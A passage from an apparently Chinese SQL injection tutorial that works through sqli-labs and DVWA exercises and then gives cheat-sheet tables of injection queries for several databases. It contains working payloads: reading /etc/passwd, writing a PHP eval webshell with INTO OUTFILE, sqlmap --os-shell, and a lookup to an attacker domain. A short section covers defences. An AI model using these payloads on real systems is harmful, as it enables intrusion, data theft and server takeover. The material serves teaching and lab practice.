<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;url1&quot; <span class="comment">--seconder-order=&quot;url2&quot;</span></span><br><span class="line">#在url1执行注入语句，监听url2</span><br></pre></td></tr></table></figure>

<p>现在已经没有这种二阶注入了，sqlmap也取消了这个参数。</p>
<p>现在说二阶注入是，引用之前存入数据库的脏数据实现注入。</p>
<p>比如在某平台注册了一个用户名为admin#或者admin’#的用户，然后修改此用户的密码。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">假如修改密码时数据库内语句如下：</span><br><span class="line"><span class="keyword">update</span> passwd<span class="operator">=</span>$pass <span class="keyword">where</span> username<span class="operator">=</span>admin    #正常用户下修改密码</span><br><span class="line"><span class="keyword">update</span> passwd<span class="operator">=</span>$pass <span class="keyword">where</span> username<span class="operator">=</span>admin#   #恶意用户修改密码，实际上是修改zhangsan的密码</span><br></pre></td></tr></table></figure>

<p>sqli-lib第24关就是一个注册改密码的二阶注入。</p>
<p>也叫二次注入，可以概括为以下两步: </p>
<ul>
<li>第一步：插入恶意数据 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>
<li>第二步：引用恶意数据 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>
</ul>
<p>大概意思就是注册的地方不存在SQL注入，修改密码的地方也不存在SQL注入，但是两者结合可以修改admin用户的密码。</p>
<h1 id="9-宽字节注入"><a href="#9-宽字节注入" class="headerlink" title="9 宽字节注入"></a>9 宽字节注入</h1><p>宽字节注入是数据库编码采用GBK编码时所产生的漏洞。尽管现在使用GBK编码的数据库已不多见，但由于这个漏洞绕过网站转义机制的经典性，仍然具有很大的启发意义。</p>
<p>下图为MariaDB默认的编码，通过 <code>alter database [数据库名] character set [字符集名]</code>，可以修改数据库编码。如果改为GBK编码，这一漏洞就会存在。</p>
<p><img src="/img/20220926190907.png"></p>
<p>以sqli-lab的第32关为例。</p>
<p>当我们输入<code>&#39;</code>时，网站防御机制利用 <code>\</code> 对 <code>&#39;</code> 进行转义，使 <code>&#39;</code> 被看做一个字符而非数据库查询语句。</p>
<p>mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%ab%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围,如%ab，%df）。</p>
<p><code>%27</code> 就是单引号会被转义成 <code>\&#39;</code> 也就是 <code>%5c%27</code> ，如果我们输入 <code>%ab%27</code> ，在后台 <code>%5c</code> 插入到单引号 <code>%27</code> 前，<code>%ab%5c</code>组成一个汉字，使得单引号重新起作用。</p>
<h1 id="10-堆叠注入"><a href="#10-堆叠注入" class="headerlink" title="10 堆叠注入"></a>10 堆叠注入</h1><p>mysql数据库sql语句的默认结束符是以”;”号结尾，在执行多条sql语句时就要使用结束符隔开，而堆叠注入其实就是通过结束符来执行多条sql语句。</p>
<p>堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服<br>务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中mysqli_multi_query()函数,这个函数在支持同时执行多条sql语句,而与之对应的mysqli_query()函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数,简单总结下来就是</p>
<ul>
<li>目标存在sql注入漏洞</li>
<li>目标未对”;”号进行过滤</li>
<li>目标中间层查询数据库信息时可同时执行多条sql语句</li>
</ul>
<p>数据库的堆叠查询可以执行多条语句，多语句之间可以用分号隔开。</p>
<p>堆叠注入就是利用这个特点，可以在第二个SQL语句中构造自己要执行的语句。</p>
<p>以下例子出自sqli-lab第38关。</p>
<p><img src="/img/20220926193458.png"></p>
<p>注入如下语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">123456</span><span class="string">&#x27; where username=&#x27;</span>Dumb<span class="string">&#x27;;--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/20220926193516.png"></p>
<h1 id="11-利用SQL注入读取与写入文件"><a href="#11-利用SQL注入读取与写入文件" class="headerlink" title="11 利用SQL注入读取与写入文件"></a>11 利用SQL注入读取与写入文件</h1><h2 id="11-1利用SQL注入读取文件"><a href="#11-1利用SQL注入读取文件" class="headerlink" title="11.1利用SQL注入读取文件"></a>11.1利用SQL注入读取文件</h2><p>利用load_file()函数可以读取数据库有权限读取的文件。</p>
<p>如，读&#x2F;etc&#x2F;passwd，因为这个文件所有用户都有读取权限，所以用作演示。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,load_file(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;);#</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/20230618103115.png"></p>
<h2 id="11-2-利用SQL注入写入文件"><a href="#11-2-利用SQL注入写入文件" class="headerlink" title="11.2 利用SQL注入写入文件"></a>11.2 利用SQL注入写入文件</h2><p>利用outfile函数可以在数据库有写权限的目录写入文件。</p>
<h3 id="11-2-1-将数据库查询结果写入文件"><a href="#11-2-1-将数据库查询结果写入文件" class="headerlink" title="11.2.1 将数据库查询结果写入文件"></a>11.2.1 将数据库查询结果写入文件</h3><p>如将对user和password的查询结果写入&#x2F;var&#x2F;www&#x2F;html目录下命名为1.bak的文件中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and 1=2 union select user,password from users into outfile &#x27;/var/www/html/1.bak&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="/img/20230618103310.png"></p>
<p>出现这种报错是因为数据库在&#x2F;var&#x2F;www&#x2F;html目录下没有写入权限。</p>
<p>我们作弊，给这个目录777权限。然后重新执行此语句。</p>
<p><img src="/img/20230618103357.png"></p>
<p>查看服务器发现文件成功写入 或者通过web下载文件。</p>
<p><img src="/img/20230618103439.png"></p>
<p><img src="/img/20230618103518.png"></p>
<p><img src="/img/20230618103534.png"></p>
<p>其中密码为MD5加密的值，可以在MD5在线解密网站解密<a target="_blank" rel="noopener" href="https://www.bejson.com/enc/md5dsc/">https://www.bejson.com/enc/md5dsc/</a></p>
<p><img src="/img/20230618103605.png"></p>
<h3 id="11-2-2-写入一句话木马"><a href="#11-2-2-写入一句话木马" class="headerlink" title="11.2.2 写入一句话木马"></a>11.2.2 写入一句话木马</h3><p>利用outfile函数可以将一句话木马写入到一个文件内，并保存在数据库有写入权限的web路径下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and 1=2 union select 1,&#x27;&lt;?php @eval($_POST[123])?&gt;&#x27; into outfile &#x27;/var/www/html/111.php&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="/img/20230618103734.png"></p>
<p>我们作弊查看服务器该路径，发现已经写入了文件。</p>
<p><img src="/img/20230618103833.png"></p>
<p>浏览器访问这个文件，发现其存在，空白说明php代码已被解析。</p>
<p><img src="/img/20230618103901.png"></p>
<p>我们可以用蚁剑工具连接这个webshell。</p>
<p><img src="/img/20230618114537.png"></p>
<p><img src="/img/20230618114646.png"></p>
<h3 id="11-2-3-利用sqlmap获得shell权限"><a href="#11-2-3-利用sqlmap获得shell权限" class="headerlink" title="11.2.3 利用sqlmap获得shell权限"></a>11.2.3 利用sqlmap获得shell权限</h3><p>Sqlmap证明存在注入并确保有dba权限。所谓DBA权限就是数据库的最大权限。在MariaDB数据库中一般为root。在sql注入中，只要注入权限为DBA用户所管理的库时，才能行使数据库的完整权限，执行文件写入等操作。前文手注写入木马也是基于这个前提。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.112/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=vmhebkhe3pl91nmpij1kfnr7f7; security=low&quot; --is-dba</span><br></pre></td></tr></table></figure>

<p><img src="/img/20230618114917.png"></p>
<p><code>current user is DBA: True</code>代表其具备DBA权限。</p>
<p>在sqlmap中<code>--os-shell</code>代表sqlmap将尝试获取shell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.112/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=vmhebkhe3pl91nmpij1kfnr7f7; security=low&quot; --os-shell</span><br></pre></td></tr></table></figure>

<p>选择对相应的中间件类型，这里用的lamp,所以选PHP</p>
<p><img src="/img/20230618114948.png"></p>
<p>选择2制定web站点路径</p>
<p><img src="/img/20230618115020.png"></p>
<p>输入上传目录&#x2F;var&#x2F;www&#x2F;html</p>
<p><img src="/img/20230618115053.png"></p>
<p>获得os shell</p>
<p><img src="/img/20230618115153.png"></p>
<h1 id="12-sql防御"><a href="#12-sql防御" class="headerlink" title="12 sql防御"></a>12 sql防御</h1><ol>
<li>waf</li>
<li>不用数据库的root用户，独立数据库用户，并且权限控制唯一（丢数据的损失可控）</li>
<li>系统的MySQL、Apache用户权限控制，让MySQL用户无权限访问web目录，权限控制</li>
<li>站库分离，通过漏洞往MySQL服务器写的文件，web服务器站点无法访问到，就无法通过webshell工具连接。</li>
<li>代码层面的修复，过滤等等。</li>
</ol>
<p><img src="/img/20230618114356.png"></p>
<h3 id="1-过滤"><a href="#1-过滤" class="headerlink" title="1 过滤"></a>1 过滤</h3><p>可以对用户提交的敏感字符进行过滤和拦截。</p>
<h3 id="2-转义"><a href="#2-转义" class="headerlink" title="2 转义"></a>2 转义</h3><p>可以对用户提交的敏感字符进行转义。</p>
<h3 id="3-参数化查询"><a href="#3-参数化查询" class="headerlink" title="3 参数化查询"></a>3 参数化查询</h3><p>参数化查询也叫做预处理，它分两个步骤处理用户的输入。</p>
<ul>
<li>网站应用程序指定了查询语句结构，并为用户输入的每个数据预留了占位符。</li>
<li>网站应用程序指定每个占位符的内容。</li>
</ul>
<p>在第二个步骤中，用户输入被填入占位符，但不会改变第一个步骤中预设好的查询语句结构。这样，网站应用程序就不会将用户输入判断为sql语句执行了，而会把用户的输入当做一个整体去查询。</p>
<h3 id="4-加密存储"><a href="#4-加密存储" class="headerlink" title="4 加密存储"></a>4 加密存储</h3><p>对重要数据，不在表单中明文存储，而选择加密存储。</p>
<h3 id="5-限制数据库权限和特权"><a href="#5-限制数据库权限和特权" class="headerlink" title="5 限制数据库权限和特权"></a>5 限制数据库权限和特权</h3><p>将数据库用户的功能设置为最低要求；这将限制攻击者在设法获取访问权限时可以执行的操作。</p>
<h1 id="13-SQL注入绕过网站防御机制"><a href="#13-SQL注入绕过网站防御机制" class="headerlink" title="13 SQL注入绕过网站防御机制"></a>13 SQL注入绕过网站防御机制</h1><h2 id="1-SQL注入的一些细节"><a href="#1-SQL注入的一些细节" class="headerlink" title="1. SQL注入的一些细节"></a>1. SQL注入的一些细节</h2><p>当我们远程测试网站是否存在SQL注入，常常需要通过推理来进行大量测试。即看到网页上的执行结果，推理后台数据库是如何操作的。</p>
<h3 id="1-1-可能存在SQL注入的功能点"><a href="#1-1-可能存在SQL注入的功能点" class="headerlink" title="1.1 可能存在SQL注入的功能点"></a>1.1 可能存在SQL注入的功能点</h3><p>SQL注入可以出现在任何从系统或接受用户输入的前段应用程序中。</p>
<p>换句话说，每个前端与后端数据库有交互的地方，都有可能存在SQL注入漏洞。</p>
<p>比如最常见的是在搜索和登录功能。但其他与数据库交互的地方也值得注意：如cookie中，XFF中。</p>
<h3 id="1-2-闭合"><a href="#1-2-闭合" class="headerlink" title="1.2 闭合"></a>1.2 闭合</h3><p>在存在注入点的网页上，其后端代码可能是如下的几种格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = <span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = (&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>此时我们构造sql语句注入时，则要考虑闭合前面的引号括号。</p>
<p>因为如果注入后，破坏了原有的闭合，那么注入也会失败，所以闭合很重要，决定了最后是否可以注入成功。</p>
<p>如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>注入 <code>1&#39; or 1=1 --+</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;1&#x27; or 1=1 --+&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>常见的闭合形式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原代码：</span><br><span class="line">&#x27;$id&#x27;</span><br><span class="line">&quot;$id&quot;</span><br><span class="line">(&#x27;$id&#x27;)</span><br><span class="line">(&quot;$id&quot;)</span><br><span class="line">((&#x27;id&#x27;))</span><br><span class="line"></span><br><span class="line">闭合代码：</span><br><span class="line">1&#x27; #</span><br><span class="line">1&quot; #</span><br><span class="line">1&#x27;) #</span><br><span class="line">&quot;) #</span><br><span class="line">&#x27;)) #</span><br></pre></td></tr></table></figure>

<p>常见的注释截断方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line">/*</span><br><span class="line">-- -</span><br><span class="line">;%00</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<p>最后，可以用and1&#x3D;1，or 1&#x3D;1 等语句确认闭合完成，漏洞存在。</p>
<h3 id="1-3-测试列数"><a href="#1-3-测试列数" class="headerlink" title="1.3 测试列数"></a>1.3 测试列数</h3><p>除了前文中提到的 order by 语句以外。</p>
<p>也可以用如下的形式来探测：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.foo.com/index.asp?id=12+union+select+null,null--</span><br></pre></td></tr></table></figure>

<p>不断增加 <code>null</code> 至不返回。</p>
<h3 id="1-4-探测数据库指纹"><a href="#1-4-探测数据库指纹" class="headerlink" title="1.4 探测数据库指纹"></a>1.4 探测数据库指纹</h3><p>在此前的实验中，我们都是使用MariaDB作为后端数据库的，其属于mysql系列数据库。</p>
<p>如果后端数据库不同，那么SQL注入的语句也会不同。有几种探测数据库指纹信息：</p>
<ol>
<li>第一种方法找出使用后端数据库是通过观察返回的错误应用程序。 以下是一些例子的错误消息:</li>
</ol>
<p>MySql:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manualthat corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> theright syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;&#x27; at line 1</span></span><br></pre></td></tr></table></figure>

<p>Oracle:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ORA-00933: SQL command not properly ended</span><br></pre></td></tr></table></figure>

<p>MS SQL Server:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft SQL Native Client error ‘80040e14’Unclosed quotation mark after the character string</span><br></pre></td></tr></table></figure>

<p>PostgreSQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Query failed: ERROR: syntax error at or near</span><br></pre></td></tr></table></figure>

<ol>
<li>常见网页与数据库的关系。</li>
</ol>
<p><strong>代码与数据库并不存在绑定关系，以下只能做参考。</strong></p>
<p>asp : Access&#x2F;SQLServer</p>
<p>php : Mysql</p>
<p>jsp : Oracle</p>
<ol>
<li>利用语句探测数据库</li>
</ol>
<p>一种最可靠的方法是根据数据库连接字符串方式的不同进行识别。</p>
<p>如我们查询字符串<code>farmsec</code>得到了一个结果，可以在请求中提交特殊的值，测试用各种方法连接，以生成<code>farmsec</code>字符串。如过查询结果相同，就可以确定是哪一种数据库。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle:    &#x27;farm&#x27;||&#x27;sec&#x27;</span><br><span class="line">MS-SQL:    &#x27;farm&#x27;+&#x27;sec&#x27;</span><br><span class="line">MySQL:     &#x27;farm&#x27; &#x27;sec&#x27;</span><br><span class="line">PostgreSQL：&#x27;farm&#x27; || &#x27;sec&#x27;</span><br></pre></td></tr></table></figure>

<p>如果注入数字数据，可以使用下面的攻击语句来识别字符串。</p>
<p>每个语句在其对应的数据库中求值结果为0，在其他数据库中则会报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle:    BITAND(1,1)-BITAND(1,1)</span><br><span class="line">MS-SQL:    @@PACK_RECEIVED-@@PACK_RECEIVED</span><br><span class="line">MySQL:     CONNECTION_ID()-CONNECTION_ID()</span><br></pre></td></tr></table></figure>

<h3 id="1-5-各类数据库注入语句"><a href="#1-5-各类数据库注入语句" class="headerlink" title="1.5 各类数据库注入语句"></a>1.5 各类数据库注入语句</h3><p>不同的数据库，需要用不同的sql语句注入。</p>
<h4 id="1-5-1-MySQL数据库"><a href="#1-5-1-MySQL数据库" class="headerlink" title="1.5.1 MySQL数据库"></a>1.5.1 MySQL数据库</h4><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>SELECT database()</td>
<td>-</td>
</tr>
<tr>
<td>所有数据库</td>
<td>SELECT schema_name FROM information_schema.schemata</td>
<td>#版本&gt;5.0</td>
</tr>
<tr>
<td>-</td>
<td>SELECT distinct(db) FROM mysql.db</td>
<td>#管理员权限才可以执行</td>
</tr>
<tr>
<td>查询表名</td>
<td>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema !&#x3D; ‘mysql’ AND table_schema !&#x3D; ‘information_schema’</td>
<td>-</td>
</tr>
<tr>
<td>查询列名</td>
<td>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema !&#x3D; ‘mysql’ AND table_schema !&#x3D; ‘information_schema’</td>
<td>-</td>
</tr>
<tr>
<td>获取版本</td>
<td>SELECT @@version</td>
<td>-</td>
</tr>
<tr>
<td>当前用户</td>
<td>SELECT user()</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT system_user()</td>
<td>-</td>
</tr>
<tr>
<td>用户权限</td>
<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges</td>
<td>#用户权限</td>
</tr>
<tr>
<td>-</td>
<td>SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges</td>
<td>#数据库权限</td>
</tr>
<tr>
<td>-</td>
<td>SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges</td>
<td>#字段的权限</td>
</tr>
<tr>
<td>列出DBA账户</td>
<td>SELECT host, user FROM mysql.user WHERE Super_priv &#x3D; ‘Y’</td>
<td>-</td>
</tr>
<tr>
<td>选择第N行</td>
<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0</td>
<td>#行从0开始编号</td>
</tr>
<tr>
<td>-</td>
<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1</td>
<td>#行从0开始编号</td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>SELECT substr(‘abcd’, 3, 1)</td>
<td>#返回c</td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>SELECT char(65)</td>
<td>#返回A</td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>SELECT ascii(‘A’)</td>
<td>#返回65</td>
</tr>
<tr>
<td>字符串连接</td>
<td>SELECT CONCAT(‘A’,‘B’)</td>
<td>#返回AB</td>
</tr>
<tr>
<td>-</td>
<td>SELECT CONCAT(‘A’,‘B’,‘C’)</td>
<td>#返回ABC</td>
</tr>
<tr>
<td>时间睡眠</td>
<td>SELECT BENCHMARK(1000000,MD5(‘A’))</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT SLEEP(5)</td>
<td>#版本&gt;&#x3D; 5.0.12</td>
</tr>
</tbody></table>
<h4 id="1-5-2-Oracle数据库"><a href="#1-5-2-Oracle数据库" class="headerlink" title="1.5.2 Oracle数据库"></a>1.5.2 Oracle数据库</h4><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>SELECT global_name FROM global_name</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT name FROM v$database</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT instance_name FROM v$instance</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT SYS.DATABASE_NAME FROM DUAL</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>所有数据库</td>
<td>SELECT DISTINCT owner FROM all_tables</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>查询表名</td>
<td>SELECT table_name FROM all_tables</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT owner, table_name FROM all_tables</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>查询列名</td>
<td>SELECT column_name FROM all_tab_columns WHERE table_name &#x3D; ‘blah’</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT column_name FROM all_tab_columns WHERE table_name &#x3D; ‘blah’ and owner &#x3D; ‘foo’</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>获取版本</td>
<td>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT version FROM v$instance</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>当前用户</td>
<td>SELECT user FROM dual</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>用户权限</td>
<td>SELECT * FROM session_privs</td>
<td>#当前权限</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT * FROM dba_sys_privs WHERE grantee &#x3D; ‘DBSNMP’</td>
<td>#列出用户的权限</td>
<td></td>
</tr>
<tr>
<td>列出DBA账户</td>
<td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION &#x3D; ‘YES’</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>选择第N行</td>
<td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r&#x3D;9</td>
<td>#第九行</td>
<td></td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>SELECT substr(‘abcd’, 3, 1) FROM dual</td>
<td>#第3个字符c</td>
<td></td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>SELECT chr(65) FROM dual</td>
<td>#返回A</td>
<td></td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>SELECT ascii(‘A’) FROM dual</td>
<td>#返回65</td>
<td></td>
</tr>
<tr>
<td>字符串连接</td>
<td>SELECT ‘A’ \</td>
<td>‘B’ FROM dual</td>
<td>#返回AB</td>
</tr>
<tr>
<td>时间睡眠</td>
<td>SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual</td>
<td>#如果反向查询很慢</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual</td>
<td>#如果正向查询很慢</td>
<td></td>
</tr>
</tbody></table>
<h4 id="1-5-3-MSSQL数据库"><a href="#1-5-3-MSSQL数据库" class="headerlink" title="1.5.3 MSSQL数据库"></a>1.5.3 MSSQL数据库</h4><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>SELECT DB_NAME()</td>
<td>-</td>
</tr>
<tr>
<td>所有数据库</td>
<td>SELECT name FROM master…sysdatabases</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT DB_NAME(N)</td>
<td>#N为0,1,2,…</td>
</tr>
<tr>
<td>查询表名</td>
<td>SELECT name FROM master…sysobjects WHERE xtype &#x3D; ‘U’</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT name FROM someotherdb…sysobjects WHERE xtype &#x3D; ‘U’</td>
<td>-</td>
</tr>
<tr>
<td>查询列名</td>
<td>SELECT name FROM syscolumns WHERE id &#x3D; (SELECT id FROM sysobjects WHERE name &#x3D; ‘mytable’)</td>
<td>#当前数据库</td>
</tr>
<tr>
<td>-</td>
<td>SELECT master…syscolumns.name, TYPE_NAME(master…syscolumns.xtype) FROM master…syscolumns, master…sysobjects WHERE master…syscolumns.id&#x3D;master…sysobjects.id AND master…sysobjects.name&#x3D;‘sometable’</td>
<td>#列出master…sometable的列名称</td>
</tr>
<tr>
<td>获取版本</td>
<td>SELECT @@version</td>
<td>-</td>
</tr>
<tr>
<td>当前用户</td>
<td>SELECT user_name()</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT system_user</td>
<td>-</td>
</tr>
<tr>
<td>-</td>
<td>SELECT user</td>
<td>-</td>
</tr>
<tr>
<td>用户权限</td>
<td>SELECT permission_name FROM master…fn_my_permissions(null,‘DATABASE’)</td>
<td>#当前数据库权限</td>
</tr>
<tr>
<td>-</td>
<td>SELECT is_srvrolemember(‘sysadmin’)</td>
<td>#当前用户权限</td>
</tr>
<tr>
<td>列出DBA账户</td>
<td>SELECT is_srvrolemember(‘sysadmin’)</td>
<td>#当前用户是否是管理员，是则返回1</td>
</tr>
<tr>
<td>选择第N行</td>
<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master…syslogins ORDER BY name ASC) sq ORDER BY name DESC</td>
<td>#返回第九行</td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>SELECT substring(‘abcd’, 3, 1)</td>
<td>#返回c</td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>SELECT char(0×41)</td>
<td>#返回A</td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>SELECT ascii(‘A’)</td>
<td>#返回65</td>
</tr>
<tr>
<td>字符串连接</td>
<td>SELECT ‘A’ + ‘B’</td>
<td>#返回AB</td>
</tr>
<tr>
<td>时间睡眠</td>
<td>WAITFOR DELAY ‘0:0:5’</td>
<td>#睡眠5秒</td>
</tr>
</tbody></table>
<h4 id="1-5-4-PostgreSQL数据库"><a href="#1-5-4-PostgreSQL数据库" class="headerlink" title="1.5.4 PostgreSQL数据库"></a>1.5.4 PostgreSQL数据库</h4><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>SELECT current_database()</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>所有数据库</td>
<td>SELECT datname FROM pg_database</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>查询表名</td>
<td>SELECT relname, A.attname FROM pg_class C, pg_namespace N,pg_attribute A, pg_type T WHERE (C.relkind&#x3D;‘r’) AND (N.oid&#x3D;C.relnamespace) AND (A.attrelid&#x3D;C.oid) AND (A.atttypid&#x3D;T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>查询列名</td>
<td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid &#x3D; c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>获取版本</td>
<td>SELECT version()</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>当前用户</td>
<td>SELECT user;</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT current_user;</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT session_user;</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT usename FROM pg_user;</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT getpgusername();</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>用户权限</td>
<td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>列出DBA账户</td>
<td>SELECT usename FROM pg_user WHERE usesuper IS TRUE</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>选择第N行</td>
<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0</td>
<td>#从0行开始编号</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>选择第N个字符</td>
<td>SELECT substr(‘abcd’, 3, 1)</td>
<td>#返回c</td>
<td></td>
</tr>
<tr>
<td>ASCII值-字符</td>
<td>SELECT chr(65)</td>
<td>#返回A</td>
<td></td>
</tr>
<tr>
<td>字符-ASCII值</td>
<td>SELECT ascii(‘A’)</td>
<td>#返回65</td>
<td></td>
</tr>
<tr>
<td>字符串连接</td>
<td>SELECT ‘A’ \</td>
<td>‘B’</td>
